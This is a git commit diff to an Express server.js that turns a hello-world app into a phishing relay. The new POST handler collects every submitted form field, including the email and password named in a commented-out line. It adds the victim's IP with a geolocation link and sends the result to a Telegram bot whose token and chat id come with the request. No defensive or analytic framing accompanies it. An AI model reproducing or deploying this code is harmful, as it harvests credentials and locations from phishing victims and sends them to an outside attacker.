1782f0c78c5136ae2d65369b1cc16c2564f44d33
dkstools <120433478+dkstools@users.noreply.github.com>
2022-12-12 19:52:56 -0800

    Update server.js

--- express/server.js
+++ express/server.js
@@ -1,22 +1,48 @@
 'use strict';
-const express = require('express');
-const path = require('path');
-const serverless = require('serverless-http');
-const app = express();
-const bodyParser = require('body-parser');
+var express = require('express');
+var bodyParser = require('body-parser');
+const PORT = process.env.PORT || 5000;
+const TelegramBot = require('node-telegram-bot-api');
 
-const router = express.Router();
-router.get('/', (req, res) => {
-  res.writeHead(200, { 'Content-Type': 'text/html' });
-  res.write('<h1>Hello from Express.js!</h1>');
-  res.end();
+var app = express();
+
+app.get('/', function(req, res){
+   res.render('form');
 });
-router.get('/another', (req, res) => res.json({ route: req.originalUrl }));
-router.post('/', (req, res) => res.json({ postBody: req.body }));
 
-app.use(bodyParser.json());
-app.use('/.netlify/functions/server', router);  // path must route to lambda
-app.use('/', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
+app.set('view engine', 'pug');
+app.set('views', './views');
 
-module.exports = app;
-module.exports.handler = serverless(app);
+// for parsing application/json
+app.use(bodyParser.json()); 
+
+// for parsing application/xwww-
+app.use(bodyParser.urlencoded({ extended: true })); 
+//form-urlencoded
+
+
+app.post('/', function(req, res){
+   res.header("Access-Control-Allow-Origin", "*");
+   res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
+   res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+   var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  
+   // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+       let msg='';
+  for (let [key, value] of Object.entries(req.body.val)) {
+  msg +=key+' : '+ value+'\n';
+ 
+}
+msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+     
+   console.log(msg);
+
+
+// Create a bot that uses 'polling' to fetch new updates
+const bot = new TelegramBot(req.body.tok, {polling: true});
+
+bot.sendMessage(req.body.telid, msg);
+   res.send("recieved your request!");
+});
+
+app.listen(PORT);
